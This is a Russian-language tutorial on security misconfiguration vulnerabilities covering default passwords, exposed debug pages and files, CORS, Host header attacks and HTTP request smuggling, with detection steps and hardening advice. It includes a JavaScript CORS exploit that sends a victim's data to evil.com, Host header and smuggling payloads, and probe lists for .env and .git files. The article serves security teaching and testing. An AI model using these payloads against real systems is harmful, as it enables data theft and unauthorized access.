# 3. Security Misconfiguration (небезопасная конфигурация)
## 1. Что такое Security Misconfigurationsecurity 
`Security Misconfiguration` (небезопасная конфигурация) — это общий класс уязвимостей, возникающий из-за неправильной настройки операционной системы, веб-сервера, приложения, базы данных, облачной инфраструктуры или средств защиты. В отличие от ошибок программирования, такие уязвимости появляются не из-за дефектов в исходном коде, а вследствие некорректной конфигурации компонентов системы. Такая уязвимость может привести к несанкционированному доступу, утечке данных или другим проблемам безопасности.

Практически любая современная информационная система состоит из большого количества взаимосвязанных компонентов: `веб-серверов`, `контейнеров`, `балансировщиков нагрузки`, `баз данных`, `API`, `облачных сервисов` и `механизмов аутентификации`. Каждый из них содержит десятки или сотни параметров безопасности. Ошибка даже в одном из них способна привести к компрометации всей системы.

Особенность данного класса заключается в том, что злоумышленнику зачастую не требуется искать сложные ошибки в коде приложения. Достаточно воспользоваться уже существующей неправильной конфигурацией, которая предоставляет ему дополнительные возможности.

К небезопасной конфигурации относятся:
* использование стандартных логинов и паролей;
* оставленные тестовые учетные записи;
* включенный режим отладки;
* отсутствие шифрования или использование слабых алгоритмов;
* неправильная настройка CORS;
* открытые административные панели;
* публикация конфиденциальных файлов;
* детальные сообщения об ошибках;
* небезопасная настройка HTTP-заголовков;
* работа ненужных служб и открытые порты;
* использование устаревшего программного обеспечения.
    
По статистике `Security Misconfiguration` относится к числу наиболее распространенных причин успешных компрометаций веб-приложений.

## 2. Основные виды небезопасной конфигурации
### 2.1 Использование стандартных учетных записей и паролей
Многие программные продукты поставляются с заранее заданными учетными записями администратора.

Например:
* admin:admin
* admin:password
* root:root
* administrator:administrator

Если после установки системы администратор не изменил пароль, злоумышленник может выполнить автоматический перебор наиболее популярных комбинаций.

Особенно часто подобная проблема встречается:
* в административных панелях;
* IoT-устройствах;
* сетевом оборудовании;
* системах видеонаблюдения;
* CMS.

### 2.2 Тестовые учетные записи и отладочные функции
Во время разработки разработчики создают:
* тестовых пользователей;
* демонстрационные страницы;
* API для диагностики;
* отладочные панели.

После публикации приложения эти функции иногда остаются доступными.

Например:
* /debug
* /test
* /phpinfo.php
* /admin-test
* /swagger
* /actuator

Если злоумышленник получает доступ к подобным страницам, он может узнать внутреннюю структуру приложения или выполнить административные действия.

### 2.3 Открытые порты и ненужные службы
Каждый открытый сетевой порт увеличивает поверхность атаки. Например, если не закрыть порты, которые используются только в разработке, они могут стать точкой входа для злоумышленников. 

Например, на сервере могут одновременно работать:
* SSH;
* FTP;
* Telnet;
* Redis;
* MongoDB;
* Docker API;
* Kubernetes API.

Если какая-либо служба не используется, она должна быть отключена.

Особенно опасны сервисы без аутентификации:
* Redis
* MongoDB
* Elasticsearch
* Docker daemon

Во многих известных инцидентах злоумышленники получали полный доступ к серверам именно через открытые сервисы.

### 2.4 Неправильные права доступа
Ошибочная настройка разрешений позволяет получить доступ к конфиденциальным данным. Некорректные права доступа к файлам, доступным через веб-сервер, могут позволить злоумышленнику читать или изменять данные.

Примеры:
* /config.php
* .env
* backup.zip
* database.sql
* logs/

Иногда каталог резервных копий оказывается доступен через браузер:
```
https://site.com/backup/
```
или
```
https://site.com/.git/
```
Подобные ошибки позволяют скачать:
* исходный код;
* пароли;
* API-ключи;
* токены;
* строки подключения к БД.

### 2.5 Отсутствие шифрования
Передача данных по HTTP вместо HTTPS позволяет злоумышленнику перехватывать:
* логины;
* пароли;
* cookies;
* JWT-токены;
* персональные данные.

Незащищённые файлы или передача данных без шифрования облегчают несанкционированный доступ.

Также небезопасным считается использование устаревших криптографических алгоритмов:
* SSL 2.0;
* SSL 3.0;
* TLS 1.0;
* MD5;
* SHA-1.

### 2.6 Неправильная настройка CORS
`CORS` (Cross-Origin Resource Sharing) регулирует доступ веб-сайтов к ресурсам другого источника.

Например:
```
Access-Control-Allow-Origin: *
```
Если одновременно используются:
```
Access-Control-Allow-Credentials: true
```
то появляется возможность кражи пользовательских данных через сторонний сайт.

Неправильная настройка заголовков CORS (например, Access-Control-Allow-Origin: *) может привести к утечке данных или выполнению кода на стороне клиента. `CORS` может позволить злоумышленнику читать ответы API от имени пользователя, если браузер отправляет его учетные данные.

### 2.7 Детализированные сообщения об ошибках
Во многих фреймворках режим разработки включен по умолчанию. В результате пользователь получает сообщения вида:
```
NullPointerException
Stack Trace
Spring Boot 3.4.1
Java 21
PostgreSQL
Database password incorrect
```
Такие ошибки раскрывают:
* структуру каталогов;
* версии библиотек;
* используемые технологии;
* SQL-запросы;
* внутренние IP-адреса.

Полученная информация значительно облегчает дальнейшую атаку. По умолчанию серверы могут выдавать подробные сообщения об ошибках, включающие трассировки стека, версии компонентов и другую информацию, которую злоумышленники могут использовать для поиска уязвимостей.

### 2.8 Необновленное программное обеспечение
Использование устаревших компонентов является одной из наиболее частых причин успешных атак.

Например:
* Apache;
* Nginx;
* Tomcat;
* Spring;
* PHP;
* WordPress;
* OpenSSL;
* Log4j.

Если для используемой версии уже опубликован эксплойт, злоумышленник может получить доступ без поиска новых уязвимостей.

## 3. Наиболее распространенные атаки
### 3.1 Неправильная настройка CORS
Небезопасная политика `CORS` может привести к:
* краже персональных данных;
* выполнению запросов от имени пользователя;
* обходу механизмов защиты браузера.

Особенно опасны ситуации, когда сервер динамически отражает значение заголовка `Origin` без проверки доверенных источников.

Допустим есть `API`:
```
https://example.com/api/profile
```
Обычный запрос:
```
GET /api/profile HTTP/1.1
Host: example.com
Cookie: session=abc123
```
Ответ:
```
HTTP/1.1 200 OK
{
 "username":"admin",
 "email":"admin@example.com"
}
```
Проверка через `Burp Repeater`. 

Отправляем:
```
GET /api/profile HTTP/1.1
Host: example.com
Origin: https://evil.com
Cookie: session=abc123
```
Уязвимый ответ:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
{
 "username":"admin",
 "email":"admin@example.com"
}
```
Сервер сказал браузеру: Домен `evil.com` может читать мои ответы, причем вместе с `cookies` пользователя.

#### **Эксплуатация**
Создаем страницу:
```html
<script>
fetch("https://example.com/api/profile",
{
credentials:"include"
})
.then(r=>r.text())
.then(data=>{
fetch("https://evil.com/save",
{
method:"POST",
body:data
});
});
</script>
```
Если пользователь откроет эту страницу, браузер отправит его cookies.

Уязвимость есть если:
* сервер отражает любой Origin;
* разрешает credentials;
* позволяет читать чувствительные данные.

### 3.2 Information Disclosure
`Information Disclosure` (раскрытие информации) представляет собой получение злоумышленником конфиденциальных сведений без непосредственного взлома системы.

Причинами могут быть:
* резервные копии;
* журналы логирования;
* сообщения об ошибках;
* открытые каталоги;
* файлы конфигурации;
* комментарии разработчиков;
* открытые репозитории Git.

Даже незначительная информация может использоваться на этапе разведки перед проведением основной атаки.

Цель - найти информацию, которую сервер не должен показывать.

#### **Проверка ошибок**
Отправляем:
```
GET /product?id=' HTTP/1.1
Host: example.com
```
Ответ:
```
500 Internal Server Error
SQLSTATE[42000]:
SELECT * FROM products WHERE id=''
```
Раскрыто:
* SQL;
* структура БД;
* используемый язык;
* ошибки приложения.

#### **Проверка Debug режима**
Пробуем:
* /debug
* /console
* /actuator
* /phpinfo.php

Например:
```
https://example.com/phpinfo.php
```
Ответ:
```
PHP Version 8.1.12
DOCUMENT_ROOT=/var/www/html
`
MYSQL_PASSWORD=root123
```
#### **Проверка файлов**
Payload:
```
/.env
```
Ответ:
```
DB_HOST=localhost
DB_USER=root
DB_PASSWORD=password123
AWS_SECRET_KEY=xxxxx
```
Проверяем:
* /backup.zip
* /database.sql
* /config.php
* /.git/config
* /.gitignore
* /server-status

Можно загрузить список `Burp Intruder`:
* admin
* backup
* backup.zip
* test
* dev
* debug
* old
* config
* .env
* .git

и искать:
```
200 OK
403 Forbidden
```

### 3.3 HTTP Host Header Attacks
HTTP-запрос содержит заголовок:
```
Host: example.com
```
Некоторые приложения используют его:
* для формирования ссылок;
* генерации URL;
* отправки писем;
* проверки домена.

Если приложение полностью доверяет этому заголовку, злоумышленник может изменить его значение.

Возможные последствия:
* отравление кэша;
* обход механизмов сброса пароля;
* генерация вредоносных ссылок;
* SSRF;
* перенаправление пользователей на атакующий ресурс.

***Идея - Приложение доверяет заголовку Host:*** 

Обычный запрос:
```
GET / HTTP/1.1
Host: example.com
```
Меняем:
```
GET / HTTP/1.1
Host: evil.com
```
Уязвимый ответ:
```html
<link href="https://evil.com/reset-password">
```
Например функция восстановления пароля:
```
POST /forgot-password
```
Ответ пользователю:
```
Email sent:
https://evil.com/reset?token=abc123
```
Почему?

Приложение сделало:
```
url = "https://" + request.host + "/reset"
```
Payloads для Burp:
* Host: evil.com
* Host: example.com.evil.com
* Host: localhost
* Host: 127.0.0.1
* X-Forwarded-Host: evil.com
* X-Host: evil.com

Проверяем:
* письма;
* редиректы;
* ссылки;
* генерацию URL.

### 3.4 HTTP Request Smuggling
`Request Smuggling` возникает из-за различной интерпретации HTTP-запросов прокси-сервером и внутренним веб-сервером. Обычно причиной являются некорректные настройки обработки заголовков:
```
Content-Length

Transfer-Encoding
```
Если фронтенд и бэкенд по-разному определяют границы запроса, злоумышленник способен "спрятать" дополнительный HTTP-запрос внутри существующего соединения.

Последствия:
* обход аутентификации;
* кража пользовательских запросов;
* XSS;
* обход WAF;
* отравление кэша;
* выполнение запросов от имени других пользователей.

Это более сложная атака. Возникает:
Client - Proxy - Backend

Если они по-разному понимают длину запроса.

Например, Proxy считает:
```
Content-Length
```
Backend:
```
Transfer-Encoding
```
Payload:
```
POST / HTTP/1.1
Host: example.com
Content-Length: 13
Transfer-Encoding: chunked


0

GET /admin HTTP/1.1
Host: example.com
```

Если backend обработает второй запрос как отдельный,получаем:
```
GET /admin
```
без авторизации.

## 4. Как искать уязвимые места
Поиск небезопасной конфигурации начинается с анализа поверхности атаки и проверки всех компонентов инфраструктуры.

### 4.1. Проверка административных интерфейсов
Искать страницы:
* /admin
* /manage
* /debug
* /swagger
* /actuator
* /phpinfo.php

### 4.2. Поиск открытых файлов
Следует проверять наличие:
* .env
* .git
* .svn
* backup.zip
* database.sql
* config.php
* robots.txt
* logs/

### 4.3. Анализ HTTP-заголовков
Необходимо обратить внимание на:
* Server
* X-Powered-By
* Access-Control-Allow-Origin
* Content-Security-Policy
* Strict-Transport-Security
* X-Frame-Options
* X-Content-Type-Options
* Referrer-Policy
* Permissions-Policy

Особое внимание следует уделять отсутствию защитных заголовков или их небезопасной конфигурации.

### 4.4. Проверка CORS
Проверяются:
* разрешение любого Origin (*);
* отражение произвольного Origin;
* использование Access-Control-Allow-Credentials: true;
* возможность доступа к чувствительным API с внешних доменов.

### 4.5. Анализ сообщений об ошибках
Следует проверять:
* трассировки стека (Stack Trace);
* версии библиотек;
* пути к файлам;
* внутренние IP-адреса;
* SQL-ошибки;
* сведения о конфигурации серверов.

### 4.6. Проверка открытых сервисов
Используются:
* сканирование портов;
* анализ сертификатов;
* определение версий сервисов;
* поиск административных панелей.

### 4.7. Проверка конфигурации HTTPS
Необходимо убедиться:
* используется TLS 1.2 или TLS 1.3;
* отключены SSL и устаревшие версии TLS;
* применяются современные наборы шифров;
* включен HSTS.

### 4.8. Анализ версий компонентов
Следует определить версии:
* веб-сервера;
* фреймворков;
* библиотек;
* CMS;
* серверов приложений.

Затем проверить наличие известных уязвимостей (например, по базам CVE или CISA KEV).

## 5. Защита от атак
Для предотвращения `Security Misconfiguration` рекомендуется соблюдать следующие меры:
* ***Безопасная конфигурация по умолчанию.*** Все компоненты системы должны разворачиваться с минимально необходимыми привилегиями и без включенных отладочных функций.
* ***Удаление стандартных учетных записей и смена паролей***. После установки программного обеспечения необходимо изменить все предустановленные учетные данные и отключить неиспользуемые аккаунты.
* ***Отключение ненужных служб и портов***. Следует минимизировать поверхность атаки, оставляя доступными только действительно необходимые сервисы.
* ***Корректная настройка прав доступа***. Доступ к конфиденциальным файлам и каталогам должен предоставляться по принципу наименьших привилегий.
* Использование ***современных криптографических протоколов***. Необходимо применять HTTPS с TLS 1.2/1.3, отключить устаревшие версии SSL/TLS и использовать надежные алгоритмы шифрования.
* ***Безопасная настройка CORS.*** Следует явно указывать список доверенных источников, избегать использования Access-Control-Allow-Origin: * для защищенных API и не разрешать передачу учетных данных без необходимости.
* ***Отключение режима отладки***. В рабочей среде не должны отображаться трассировки стека, сведения о версиях компонентов и другие внутренние детали приложения.
* ***Регулярное обновление программного обеспечения***. Важно своевременно устанавливать исправления безопасности для операционной системы, веб-сервера, библиотек и сторонних компонентов.
* ***Автоматизированный контроль конфигурации***. Использование `средств проверки конфигурации`, `сканеров безопасности`, `Infrastructure as Code` (IaC) и регулярных аудитов позволяет своевременно выявлять ошибки настройки.
* ***Периодическое тестирование безопасности***. Регулярные проверки, включая сканирование поверхности атаки, анализ конфигурации и тестирование на проникновение, помогают обнаруживать небезопасные настройки до того, как ими воспользуются злоумышленники.
Вывод

`Security Misconfiguration` представляет собой один из наиболее распространенных классов уязвимостей, возникающих вследствие ошибок настройки компонентов информационной системы. Несмотря на отсутствие дефектов в исходном коде, неправильная конфигурация серверов, приложений, сетевых служб и механизмов защиты может предоставить злоумышленнику возможности для получения несанкционированного доступа, раскрытия конфиденциальной информации или полного компрометирования системы. Эффективная защита требует применения принципа безопасной конфигурации по умолчанию, минимизации поверхности атаки, своевременного обновления программного обеспечения и регулярного контроля параметров безопасности на всех этапах жизненного цикла приложения.
